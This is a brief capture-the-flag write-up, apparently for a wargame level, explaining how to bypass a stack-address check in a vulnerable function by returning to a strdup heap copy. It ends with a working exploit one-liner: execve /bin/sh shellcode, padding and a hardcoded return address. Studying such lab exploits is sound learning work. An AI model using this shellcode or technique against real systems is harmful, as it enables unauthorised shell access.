Disassemble main
Only one function called "p()"
Disassemble p

Looking at the source code, we can't set eip to the beginning
because there is a check that prevents it "check against 0xbf... addresses"

However, we can see that there is a strdup that uses this buffer.
We can jump on the address that strdup gives us and then executing a shell code to give us a shell with level3 permissions

(python -c "print '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\x00' + 'A' * 54 + '\x08\x04\xa0\x08'[::-1]")
